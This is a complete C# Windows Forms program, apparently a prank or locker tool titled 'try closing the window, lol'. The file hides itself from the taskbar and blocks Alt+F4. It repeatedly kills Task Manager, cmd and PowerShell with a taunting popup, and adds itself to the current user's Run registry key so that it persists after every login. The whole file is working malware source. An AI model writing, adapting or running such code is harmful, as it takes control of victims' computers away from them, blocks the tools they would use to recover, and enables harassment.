using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 창을_닫아바
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            this.KeyDown += Form1_KeyDown;
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            this.ShowInTaskbar = false;
            SetStartup(true);
        }
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
                e.Handled = true;
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "Taskmgr")
                {
                    process.Kill();
                    MessageBox.Show("어림도 없지 ㅋ", " ");
                    break;
                }
            }
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "taskmgr")
                {
                    process.Kill();
                    MessageBox.Show("어림도 없지 ㅋ", " ");
                    break;
                }
            }
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "cmd")
                {
                    process.Kill();
                    MessageBox.Show("어림도 없지 ㅋ", " ");
                    break;
                }
            }
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "powershell")
                {
                    process.Kill();
                    MessageBox.Show("어림도 없지 ㅋ", " ");
                    break;
                }
            }
        }
        protected override CreateParams CreateParams
        {
            get
            {
                // Turn on WS_EX_TOOLWINDOW style bit
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;

            }
        }
        private void SetStartup(bool enable)
        {
            string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(runKey);

            if (enable)
            {
                if (startupKey.GetValue("창을 닫아바 ㅋ") == null)
                {
                    startupKey.Close();
                    startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
                    startupKey.SetValue("창을 닫아바 ㅋ", "\"" + Application.ExecutablePath + "\"");
                    startupKey.Close();
                }
            }
            else
            {
                startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
                startupKey.DeleteValue("창을 닫아바 ㅋ", false);
                startupKey.Close();
            }
        }
    }
}
